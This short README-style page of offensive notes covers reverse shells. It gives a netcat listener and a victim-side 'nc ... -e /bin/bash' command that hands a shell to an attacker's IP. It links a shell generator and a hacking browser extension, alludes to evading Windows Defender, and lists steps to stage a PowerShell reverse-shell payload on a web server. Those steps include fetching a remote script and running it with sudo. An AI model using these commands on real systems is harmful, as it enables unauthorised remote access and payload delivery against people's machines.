# ShellCode

### Shell Generator Resources(Reverse, Bind, HoaxShell, MSFVenom)
[Shell Generator](https://www.revshells.com)

**MAC OS Example:**

- Attacker: nc -lvnp 1337

- Victim: nc 192.168.50.53 1337 -e /bin/bash

**Windwos 11 Example:**

- cat & mouse game to bypass defender


### Browser Extensions
[Hack-Tools Chrome Extension](https://chromewebstore.google.com/detail/hack-tools/cmbndhnoonmghfofefkcccljbkdpamhi)

### Spin Up a local Web Server on Linux
To set up a web server and host your script, follow these steps:

Create a PowerShell script:
   ```bash
   touch powershellreverse.bat
   echo "<ShellCode here>" > powershellreverse.bat
   wget https://github.com/NickolayMOmelchenko/ShellCode/raw/refs/heads/main/setup_windows_website.sh
   chmod +x setup_windows_website.sh
   sudo ./setup_windows_website.sh

